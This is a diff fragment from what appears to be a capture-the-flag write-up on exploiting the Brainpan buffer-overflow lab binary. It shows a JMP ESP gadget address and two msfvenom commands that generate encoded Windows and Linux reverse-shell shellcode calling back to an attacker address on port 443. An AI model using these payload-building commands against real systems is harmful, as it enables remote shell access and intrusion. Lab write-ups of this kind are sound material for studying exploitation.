@@ -140,7 +140,7 @@ nasm > jmp esp
 ```
  0x311712f3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\librah\Dropbox\kali-vm\brainpan.exe)
 ```
-- Generate reverse shell code..  Target system might actually be a Linux presenting it's a Windows
+- Generate reverse shell code..  Target system might actually be a Linux running wine (windows emulator)
 ```sh
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86_shikata_ga_nai -b "\x00\x0a\x0d"
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.142.128 LPORT=443 -f c -e x86_shikata_ga_nai -b "\x00\x0a\x0d"
